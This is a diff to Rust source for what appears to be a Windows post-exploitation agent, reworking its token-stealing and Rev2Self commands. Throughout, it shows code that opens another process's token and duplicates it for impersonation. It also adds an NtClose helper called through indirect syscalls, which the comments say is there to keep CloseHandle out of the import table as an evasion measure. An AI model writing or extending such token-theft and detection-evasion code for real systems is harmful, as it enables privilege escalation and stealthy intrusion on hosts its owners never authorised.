@@ -23,8 +23,13 @@ use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, RevertT
 use winapi::um::winnt::TOKEN_STATISTICS;
 use winapi::um::winnt::TokenStatistics;
 
-/// Stores the original primary token so `Rev2Self` can restore it.
+/// Stores the impersonation token so `Rev2Self` can close it.
 static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);
+
+/// Stores the original primary token captured on first impersonation.
+/// Populated exactly once; subsequent `steal_token` calls must NOT
+/// overwrite this — doing so would leak the handle.
+static mut SAVED_PRIMARY_TOKEN: Option<HANDLE> = None;
 
 // ── Logon type constants (from winnt.h) ────────────────────────────────────
 const LOGON32_LOGON_INTERACTIVE: u32 = 2;
@@ -99,6 +104,22 @@ unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> 
         Err(anyhow!("NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"))
     } else {
         Ok(token)
+    }
+}
+
+/// Close a kernel handle via `NtClose` indirect syscall (avoids IAT entry for
+/// CloseHandle).  Falls back to `CloseHandle` from the IAT if the syscall
+/// resolver is unavailable.  Best-effort — errors are silently ignored.
+fn nt_close_handle(handle: u64) {
+    if handle == 0 || handle == usize::MAX as u64 {
+        return;
+    }
+    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
+        let _ = unsafe {
+            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle])
+        };
+    } else {
+        unsafe { CloseHandle(handle as *mut _ as HANDLE) };
     }
 }
 
@@ -245,8 +266,27 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
     let token = unsafe { nt_open_process_token(process, TOKEN_DUPLICATE | TOKEN_QUERY) }
         .with_context(|| format!("failed to open token for PID {target_pid}"))?;
 
-    // Save the current thread token (if any) for Rev2Self.
-    save_current_token();
+    // ── Save the original primary token (once only) ─────────────────
+    //
+    // On the very first impersonation we open our own process token and
+    // stash it in SAVED_PRIMARY_TOKEN so that Rev2Self can restore it.
+    // Subsequent calls do NOT overwrite it — that would leak the handle.
+    unsafe {
+        if SAVED_PRIMARY_TOKEN.is_none() {
+            let mut primary: HANDLE = std::ptr::null_mut();
+            let ok = winapi::um::securitybaseapi::OpenProcessToken(
+                GetCurrentProcess(),
+                TOKEN_ALL_ACCESS,
+                &mut primary,
+            );
+            if ok != 0 && !primary.is_null() {
+                SAVED_PRIMARY_TOKEN = Some(primary);
+            }
+            // If OpenProcessToken fails we proceed anyway — Rev2Self will
+            // fall back to RevertToSelf() which uses the process token
+            // implicitly.
+        }
+    }
 
     // Duplicate into an impersonation token via indirect syscall.
     let token_type = TokenImpersonation as u32;
@@ -269,15 +309,15 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
         CloseHandle(token);
         CloseHandle(process);
     }
-    // Keep new_token alive for the lifetime of the impersonation; it will
-    // be closed on Rev2Self or drop.
-    // Store it in SAVED_TOKEN so Rev2Self can close it.
+
+    // Store the impersonation token so Rev2Self can close it.
     {
         let mut saved = SAVED_TOKEN.lock().unwrap();
-        // The previously saved token was the *pre-impersonation* token.
-        // We need to store the duplicated impersonation token so we can
-        // close it on Rev2Self.  But we already called save_current_token()
-        // which saved the original.  Overwrite with the new one to close.
+        // Close any previously stored impersonation token (from a prior
+        // steal_token call that was not reverted) to avoid leaking it.
+        if let Some(old_imp) = saved.take() {
+            nt_close_handle(old_imp as u64);
+        }
         *saved = Some(new_token);
     }
 
@@ -285,17 +325,32 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
 }
 
 /// Revert to the original process token (undo `StealToken` / `MakeToken`).
+///
+/// Closes the impersonation token via `NtClose` (indirect syscall), then
+/// restores the saved primary token via `SetThreadToken(None, primary)`,
+/// and finally closes the saved primary token handle.
 pub fn rev2self() -> Result<String> {
-    let ok = unsafe { RevertToSelf() };
-    if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
-        return Err(anyhow!("RevertToSelf failed with Win32 error {err}"));
+    // ── Close the impersonation token via NtClose ──────────────────────
+    {
+        let mut saved = SAVED_TOKEN.lock().unwrap();
+        if let Some(imp_token) = saved.take() {
+            nt_close_handle(imp_token as u64);
+        }
     }
 
-    // Close the saved impersonation token if one was stored.
-    let mut saved = SAVED_TOKEN.lock().unwrap();
-    if let Some(h) = saved.take() {
-        unsafe { CloseHandle(h) };
+    // ── Restore the saved primary token ────────────────────────────────
+    //
+    // If we have a saved primary token, apply it to the thread directly.
+    // This is more reliable than RevertToSelf when the impersonation was
+    // set via SetThreadToken.  Fall back to RevertToSelf otherwise.
+    unsafe {
+        if let Some(primary) = SAVED_PRIMARY_TOKEN.take() {
+            SetThreadToken(std::ptr::null_mut(), primary);
+            // Close the saved primary token handle now that we've restored.
+            nt_close_handle(primary as u64);
+        } else {
+            RevertToSelf();
+        }
     }
 
     Ok("Rev2Self: reverted to original process token".to_string())
